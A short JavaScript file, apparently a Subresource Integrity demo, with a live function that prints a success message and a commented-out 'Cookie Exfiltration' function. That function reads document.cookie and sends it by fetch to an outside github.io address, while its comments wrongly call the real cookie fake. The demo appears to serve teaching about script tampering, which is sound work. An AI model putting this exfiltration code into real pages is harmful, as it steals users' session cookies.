function showMessage() {
  document.getElementById('output').textContent = 'SRI script loaded successfully ✅';
}


/*
// Cookie Exfiltration
function simulateSteal() {
  // Fake "cookie" value for demonstration purposes only.
  const Cookie = document.cookie;

  // Build a GET URL with the fake cookie as a query parameter.
  const url = 'https://7ragnarok7.github.io/SRI?data=' + encodeURIComponent(Cookie);

  // Demonstration fetch: credentials omitted so no real cookies are sent.
  fetch(url, { method: 'GET', credentials: 'omit' })
    .then(response => {
      console.log('Simulated exfiltration request sent. Response status:', response.status);
    })
    .catch(err => {
      console.warn('Simulated exfiltration request failed (expected in some environments):', err);
    });
}
*/
